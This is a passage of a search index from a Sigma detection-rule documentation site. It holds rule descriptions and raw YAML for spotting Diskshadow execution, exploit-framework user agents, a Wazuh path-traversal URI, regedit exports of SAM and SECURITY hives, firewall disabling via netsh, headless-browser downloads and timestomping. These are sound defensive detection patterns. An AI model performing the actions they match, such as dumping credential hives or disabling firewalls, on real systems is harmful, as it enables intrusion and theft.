","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cl_mutexverifiers_lolscript_count.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Mutexverifiers.ps1 (2 Lines)"},{"categories":null,"contents":"Detects using Diskshadow.exe to execute arbitrary code in text file\nKnown false-positives False postitve can be if administrators use diskshadow tool in their infrastructure as a main backup tool with scripts. References https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/ Raw rule (edit) title: Execution via Diskshadow.exe id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 status: test description: Detects using Diskshadow.exe to execute arbitrary code in text file author: Ivan Dyachkov, oscd.community references: - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/ date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows definition: \u0026#39;Requirements: Sysmon ProcessCreation logging must be activated and Windows audit must Include command line in process creation events\u0026#39; detection: selection: Image|endswith: \u0026#39;\\diskshadow.exe\u0026#39; CommandLine|contains: - \u0026#39;/s\u0026#39; - \u0026#39;-s\u0026#39; condition: selection fields: - CommandLine falsepositives: - False postitve can be if administrators use diskshadow tool in their infrastructure as a main backup tool with scripts. level: high tags: - attack.execution - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_diskshadow.yml/","tags":["attack.execution","attack.t1218"],"title":"Execution via Diskshadow.exe"},{"categories":null,"contents":"Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs\nKnown false-positives Unknown References https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/ Raw rule (edit) title: Exploit Framework User Agent id: fdd1bfb5-f60b-4a35-910e-f36ed3d0b32f status: test description: Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs author: Florian Roth references: - https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/ date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: # Cobalt Strike https://www.cobaltstrike.com/help-malleable-c2 - \u0026#39;Internet Explorer *\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)\u0026#39; # https://goo.gl/f4H5Ez # Metasploit Framework - Analysis by Didier Stevens https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/ - \u0026#39;Mozilla/4.0 (compatible; Metasploit RSPEC)\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\u0026#39; # old browser, rare, base-lining needed - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)\u0026#39; # old browser, rare, base-lining needed - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)\u0026#39; # old browser, rare, base-lining needed - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N\u0026#39; - \u0026#39;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026#39; # only use in proxy logs - not for detection in web server logs - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13\u0026#39; - \u0026#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)\u0026#39; # Payloads # Metasploit Update by Florian Roth 08.07.2017 - \u0026#39;Mozilla/5.0\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; SPIPE/1.0\u0026#39; # - \u0026#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\u0026#39; # too many false positives expected # - \u0026#39;Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\u0026#39; # too many false positives expected - \u0026#39;Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0\u0026#39; - \u0026#39;Sametime Community Agent\u0026#39; # Unknown if prone to false positives - used in https://goo.gl/gHZkeR - \u0026#39;X-FORWARDED-FOR\u0026#39; - \u0026#39;DotDotPwn v2.1\u0026#39; - \u0026#39;SIPDROID\u0026#39; - \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)\u0026#39; # CobaltStrike https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/ # Empire - \u0026#39;Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205 Firefox/27.0 Iceweasel/25.3.0\u0026#39; # Exploits - \u0026#39;*wordpress hash grabber*\u0026#39; - \u0026#39;*exploit*\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_frameworks.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Exploit Framework User Agent"},{"categories":null,"contents":"Detects the exploitation of the Wazuh RCE vulnerability described in CVE-2021-26814\nKnown false-positives None References https://github.com/WickdDavid/CVE-2021-26814/blob/main/PoC.py Raw rule (edit) title: Exploitation of CVE-2021-26814 in Wazuh id: b9888738-29ed-4c54-96a4-f38c57b84bb3 status: experimental description: Detects the exploitation of the Wazuh RCE vulnerability described in CVE-2021-26814 author: Florian Roth date: 2021/05/22 references: - https://github.com/WickdDavid/CVE-2021-26814/blob/main/PoC.py logsource: category: webserver detection: selection: c-uri|contains: \u0026#39;/manager/files?path=etc/lists/../../../../..\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - None level: high tags: - attack.initial_access - attack.t1190 - cve.2021.21978 - cve.2021.26814 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_26814_wzuh_rce.yml/","tags":["attack.initial_access","attack.t1190","cve.2021.21978","cve.2021.26814"],"title":"Exploitation of CVE-2021-26814 in Wazuh"},{"categories":null,"contents":"Detects the export of a crital Registry key to a file.\nKnown false-positives Dumping hives for legitimate purpouse i.e. backup or forensic investigation References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Exports Critical Registry Keys To a File id: 82880171-b475-4201-b811-e9c826cd5eaa status: test description: Detects the export of a crital Registry key to a file. author: Oddvar Moe, Sander Wiebing, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; CommandLine|contains: \u0026#39; /E \u0026#39; selection_2: CommandLine|contains: - \u0026#39;hklm\u0026#39; - \u0026#39;hkey_local_machine\u0026#39; selection_3: CommandLine|endswith: - \u0026#39;\\system\u0026#39; - \u0026#39;\\sam\u0026#39; - \u0026#39;\\security\u0026#39; condition: selection and selection_2 and selection_3 fields: - ParentImage - CommandLine falsepositives: - Dumping hives for legitimate purpouse i.e. backup or forensic investigation level: high tags: - attack.exfiltration - attack.t1012 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regedit_export_critical_keys.yml/","tags":["attack.exfiltration","attack.t1012"],"title":"Exports Critical Registry Keys To a File"},{"categories":null,"contents":"Detects the export of the target Registry key to a file.\nKnown false-positives Legitimate export of keys References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Exports Registry Key To a File id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a status: test description: Detects the export of the target Registry key to a file. author: Oddvar Moe, Sander Wiebing, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; CommandLine|contains: \u0026#39; /E \u0026#39; filter_1: # filters to avoid intersection with critical keys rule CommandLine|contains: - \u0026#39;hklm\u0026#39; - \u0026#39;hkey_local_machine\u0026#39; filter_2: CommandLine|endswith: - \u0026#39;\\system\u0026#39; - \u0026#39;\\sam\u0026#39; - \u0026#39;\\security\u0026#39; condition: selection and not (filter_1 and filter_2) fields: - ParentImage - CommandLine falsepositives: - Legitimate export of keys level: low tags: - attack.exfiltration - attack.t1012 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regedit_export_keys.yml/","tags":["attack.exfiltration","attack.t1012"],"title":"Exports Registry Key To a File"},{"categories":null,"contents":"Exports the target Registry key and hides it in the specified alternate data stream.\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Exports Registry Key To an Alternate Data Stream id: 0d7a9363-af70-4e7b-a3b7-1a176b7fbe84 status: test description: Exports the target Registry key and hides it in the specified alternate data stream. author: Oddvar Moe, Sander Wiebing, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/07 modified: 2021/11/27 logsource: product: windows category: create_stream_hash detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; condition: selection fields: - TargetFilename falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_stream_hash/sysmon_regedit_export_to_ads.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Exports Registry Key To an Alternate Data Stream"},{"categories":null,"contents":"F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nKnown false-positives Unknown References https://github.com/FSecureLABS/C3/blob/master/Src/NodeRelayDll/NodeRelayDll.cpp#L12 Raw rule (edit) title: F-Secure C3 Load by Rundll32 status: test id: b18c9d4c-fac9-4708-bd06-dd5bfacf200f author: Alfie Champion (ajpc500) date: 2021/06/02 description: F-Secure C3 produces DLLs with a default exported StartNodeRelay function. references: - https://github.com/FSecureLABS/C3/blob/master/Src/NodeRelayDll/NodeRelayDll.cpp#L12 tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;StartNodeRelay\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_c3_load_by_rundll32.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"F-Secure C3 Load by Rundll32"},{"categories":null,"contents":"Code integrity failures may indicate tampered executables.\nKnown false-positives Disk device errors Raw rule (edit) title: Failed Code Integrity Checks id: 470ec5fa-7b4e-4071-b200-4c753100f49b status: stable description: Code integrity failures may indicate tampered executables. author: Thomas Patzke date: 2019/12/03 modified: 2020/08/23 tags: - attack.defense_evasion - attack.t1027.001 logsource: product: windows service: security detection: selection: EventID: - 5038 - 6281 condition: selection falsepositives: - Disk device errors level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_codeintegrity_check_failure.yml/","tags":["attack.defense_evasion","attack.t1027.001"],"title":"Failed Code Integrity Checks"},{"categories":null,"contents":"Detects a failed installation of a Exchange Transport Agent\nKnown false-positives legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. References https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 Raw rule (edit) title: Failed MSExchange Transport Agent Installation id: c7d16cae-aaf3-42e5-9c1c-fb8553faa6fa status: experimental description: Detects a failed installation of a Exchange Transport Agent references: - https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 tags: - attack.persistence - attack.t1505.002 author: Tobias Michalski date: 2021/06/08 logsource: service: msexchange-management product: windows detection: selection: EventID: 6 keywords: - \u0026#39;Install-TransportAgent\u0026#39; condition: selection and keywords fields: - AssemblyPath falsepositives: - legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_transportagent_failed.yml/","tags":["attack.persistence","attack.t1505.002"],"title":"Failed MSExchange Transport Agent Installation"},{"categories":null,"contents":"The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service.\nKnown false-positives Unlikely References https://windows-internals.com/faxing-your-way-to-system/ Raw rule (edit) title: Fax Service DLL Search Order Hijack id: 828af599-4c53-4ed2-ba4a-a9f835c434ea status: test description: The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service. author: NVISO references: - https://windows-internals.com/faxing-your-way-to-system/ date: 2020/05/04 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - fxssvc.exe ImageLoaded|endswith: - ualapi.dll filter: ImageLoaded|startswith: - C:\\Windows\\WinSxS\\ condition: selection and not filter falsepositives: - Unlikely level: high tags: - attack.persistence - attack.defense_evasion - attack.t1574.001 - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_fax_dll.yml/","tags":["attack.persistence","attack.defense_evasion","attack.t1574.001","attack.t1574.002"],"title":"Fax Service DLL Search Order Hijack"},{"categories":null,"contents":"Detects usage of system utilities to discover files and directories\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md Raw rule (edit) title: File and Directory Discovery id: 089dbdf6-b960-4bcc-90e3-ffc3480c20f6 status: test description: Detects usage of system utilities to discover files and directories author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: select_file_with_asterisk: Image: \u0026#39;/usr/bin/file\u0026#39; CommandLine|re: \u0026#39;(.){200,}\u0026#39; # execution of the \u0026#39;file */* *\u0026gt;\u0026gt; /tmp/output.txt\u0026#39; will produce huge commandline select_recursive_ls: Image: \u0026#39;/bin/ls\u0026#39; CommandLine|contains: \u0026#39;-R\u0026#39; select_find_execution: Image: \u0026#39;/usr/bin/find\u0026#39; select_mdfind_execution: Image: \u0026#39;/usr/bin/mdfind\u0026#39; select_tree_execution|endswith: Image: \u0026#39;/tree\u0026#39; condition: 1 of select* falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1083 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml/","tags":["attack.discovery","attack.t1083"],"title":"File and Directory Discovery"},{"categories":null,"contents":"Detects usage of system utilities to discover files and directories\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md Raw rule (edit) title: File and Directory Discovery id: d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72 status: test description: Detects usage of system utilities to discover files and directories author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: select_file_with_asterisk: Image|endswith: \u0026#39;/file\u0026#39; CommandLine|re: \u0026#39;(.){200,}\u0026#39; # execution of the \u0026#39;file */* *\u0026gt;\u0026gt; /tmp/output.txt\u0026#39; will produce huge commandline select_recursive_ls: Image|endswith: \u0026#39;/ls\u0026#39; CommandLine|contains: \u0026#39;-R\u0026#39; select_find_execution: Image|endswith: \u0026#39;/find\u0026#39; select_tree_execution: Image|endswith: \u0026#39;/tree\u0026#39; condition: 1 of select* falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1083 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_file_and_directory_discovery.yml/","tags":["attack.discovery","attack.t1083"],"title":"File and Directory Discovery"},{"categories":null,"contents":"Detects file deletion commands\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md Raw rule (edit) title: File Deletion id: 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57 status: stable description: Detects file deletion commands author: Ömer Günal, oscd.community date: 2020/10/07 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/rm\u0026#39; # covers /rmdir as well - \u0026#39;/shred\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.defense_evasion - attack.t1070.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"File Deletion"},{"categories":null,"contents":"This is an unusual method to download files. It starts a browser headless and downloads a file from a location. This can be used by threat actors to download files.\nKnown false-positives unknown References https://twitter.com/mrd0x/status/1478234484881436672?s=12 Raw rule (edit) title: File Download with Headless Browser id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e description: This is an unusual method to download files. It starts a browser headless and downloads a file from a location. This can be used by threat actors to download files. author: Sreeman, Florian Roth date: 2022/01/04 references: - https://twitter.com/mrd0x/status/1478234484881436672?s=12 tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\msedge.exe\u0026#39; - \u0026#39;\\chrome.exe\u0026#39; CommandLine|contains|all: - \u0026#39;--headless\u0026#39; - \u0026#39;dump-dom\u0026#39; - \u0026#39;http\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_headless_browser_file_download.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"File Download with Headless Browser"},{"categories":null,"contents":"Detect file time attribute change to hide new or changes to existing files.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md Raw rule (edit) title: \u0026#39;File Time Attribute Change\u0026#39; id: b3cec4e7-6901-4b0d-a02d-8ab2d8eb818b status: test description: \u0026#39;Detect file time attribute change to hide new or changes to existing files.\u0026#39; author: \u0026#39;Igor Fits, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: \u0026#39;EXECVE\u0026#39; touch: - \u0026#39;touch\u0026#39; selection2: - \u0026#39;-t\u0026#39; - \u0026#39;-acmr\u0026#39; - \u0026#39;-d\u0026#39; - \u0026#39;-r\u0026#39; condition: execve and touch and selection2 falsepositives: - \u0026#39;Unknown\u0026#39; level: medium tags: - attack.defense_evasion - attack.t1070.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_change_file_time_attr.yml/","tags":["attack.defense_evasion","attack.t1070.006"],"title":"File Time Attribute Change"},{"categories":null,"contents":"Detect file time attribute change to hide new or changes to existing files.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md Raw rule (edit) title: \u0026#39;File Time Attribute Change\u0026#39; id: 88c0f9d8-30a8-4120-bb6b-ebb54abcf2a0 status: test description: \u0026#39;Detect file time attribute change to hide new or changes to existing files.\u0026#39; author: \u0026#39;Igor Fits, Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: \u0026#39;/touch\u0026#39; selection2: CommandLine|contains: - \u0026#39;-t\u0026#39; - \u0026#39;-acmr\u0026#39; - \u0026#39;-d\u0026#39; - \u0026#39;-r\u0026#39; condition: selection1 and selection2 falsepositives: - \u0026#39;Unknown\u0026#39; level: medium tags: - attack.defense_evasion - attack.t1070.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_change_file_time_attr.yml/","tags":["attack.defense_evasion","attack.t1070.006"],"title":"File Time Attribute Change"},{"categories":null,"contents":"Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack\nKnown false-positives unknown References https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/ Raw rule (edit) title: Findstr Launching .lnk File id: 33339be3-148b-4e16-af56-ad16ec6c7e7b status: test description: Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack author: Trent Liffick references: - https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/ date: 2020/05/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\findstr.exe\u0026#39; CommandLine|endswith: \u0026#39;.lnk\u0026#39; condition: selection fields: - Image - CommandLine - ParentCommandLine falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1036 - attack.t1202 - attack.t1027.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_findstr_lnk.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1202","attack.t1027.003"],"title":"Findstr Launching .lnk File"},{"categories":null,"contents":"Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays\nKnown false-positives Admin activity (unclear what they do nowadays with finger.exe) References https://twitter.com/bigmacjpg/status/1349727699863011328?s=12 https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/ http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt Raw rule (edit) title: Finger.exe Suspicious Invocation id: af491bca-e752-4b44-9c86-df5680533dbc description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays status: experimental author: Florian Roth, omkar72, oscd.community date: 2021/02/24 references: - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12 - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/ - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\finger.exe\u0026#39; condition: selection falsepositives: - Admin activity (unclear what they do nowadays with finger.exe) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_finger_usage.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Finger.exe Suspicious Invocation"},{"categories":null,"contents":"Detects Archer malware invocation via rundll32\nKnown false-positives Unknown References https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/ https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100 Raw rule (edit) title: Fireball Archer Install id: 3d4aebe0-6d29-45b2-a8a4-3dfde586a26d status: test description: Detects Archer malware invocation via rundll32 author: Florian Roth references: - https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/ - https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100 date: 2017/06/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;InstallArcherSvc\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_crime_fireball.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218.011"],"title":"Fireball Archer Install"},{"categories":null,"contents":"Detects netsh commands that turns off the Windows firewall\nKnown false-positives Legitimate administration References https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/ https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall Raw rule (edit) title: Firewall Disabled via Netsh id: 57c4bf16-227f-4394-8ec7-1b745ee061c3 status: test description: Detects netsh commands that turns off the Windows firewall author: Fatih Sirin references: - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/ - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall date: 2019/11/01 modified: 2022/01/09 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - netsh - firewall - set - opmode - \u0026#39;mode=disable\u0026#39; selection_2: CommandLine|contains|all: - netsh - advfirewall - set - state - \u0026#39;off\u0026#39; condition: 1 of selection_* falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 - attack.s0108 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_firewall_disable.yml/","tags":["attack.defense_evasion","attack.t1562.004","attack.s0108"],"title":"Firewall Disabled via Netsh"},{"categories":null,"contents":"This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes\nKnown false-positives update the excluded named pipe to filter out any newly observed legit named pipe References https://twitter.com/menasec1/status/1104489274387451904 Raw rule (edit) title: First Time Seen Remote Named Pipe id: 52d8b0c6-53d6-439a-9e41-52ad442ad9ad status: test description: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes author: Samir Bousseaden references: - https://twitter.com/menasec1/status/1104489274387451904 date: 2019/04/03 modified: 2021/12/06 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection1: EventID: 5145 ShareName: \\\\\\*\\IPC$ false_positives: RelativeTargetName: - \u0026#39;atsvc\u0026#39; - \u0026#39;samr\u0026#39; - \u0026#39;lsarpc\u0026#39; - \u0026#39;lsass\u0026#39; - \u0026#39;winreg\u0026#39; - \u0026#39;netlogon\u0026#39; - \u0026#39;srvsvc\u0026#39; - \u0026#39;protected_storage\u0026#39; - \u0026#39;wkssvc\u0026#39; - \u0026#39;browser\u0026#39; - \u0026#39;netdfs\u0026#39; - \u0026#39;svcctl\u0026#39; - \u0026#39;spoolss\u0026#39; - \u0026#39;ntsvcs\u0026#39; - \u0026#39;LSM_API_service\u0026#39; - \u0026#39;HydraLsPipe\u0026#39; - \u0026#39;TermSrv_API_service\u0026#39; - \u0026#39;MsFteWds\u0026#39; - \u0026#39;sql\\query\u0026#39; condition: selection1 and not false_positives falsepositives: - update the excluded named pipe to filter out any newly observed legit named pipe level: high tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_lm_namedpipe.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"First Time Seen Remote Named Pipe"},{"categories":null,"contents":"This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes\nKnown false-positives update the excluded named pipe to filter out any newly observed legit named pipe References https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_lm_namedpipe.yml Raw rule (edit) title: First Time Seen Remote Named Pipe - Zeek id: 021310d9-30a6-480a-84b7-eaa69aeb92bb status: test description: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes author: \u0026#39;Samir Bousseaden, @neu5ron\u0026#39; references: - https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_lm_namedpipe.yml date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection1: path: \\\\\\*\\IPC$ selection2: path: \\\\\\*\\IPC$ name: - \u0026#39;atsvc\u0026#39; - \u0026#39;samr\u0026#39; - \u0026#39;lsarpc\u0026#39; - \u0026#39;winreg\u0026#39; - \u0026#39;netlogon\u0026#39; - \u0026#39;srvsvc\u0026#39; - \u0026#39;protected_storage\u0026#39; - \u0026#39;wkssvc\u0026#39; - \u0026#39;browser\u0026#39; - \u0026#39;netdfs\u0026#39; - \u0026#39;svcctl\u0026#39; - \u0026#39;spoolss\u0026#39; - \u0026#39;ntsvcs\u0026#39; - \u0026#39;LSM_API_service\u0026#39; - \u0026#39;HydraLsPipe\u0026#39; - \u0026#39;TermSrv_API_service\u0026#39; - \u0026#39;MsFteWds\u0026#39; condition: selection1 and not selection2 falsepositives: - update the excluded named pipe to filter out any newly observed legit named pipe level: high tags: - attack.lateral_movement - attack.t1021.002 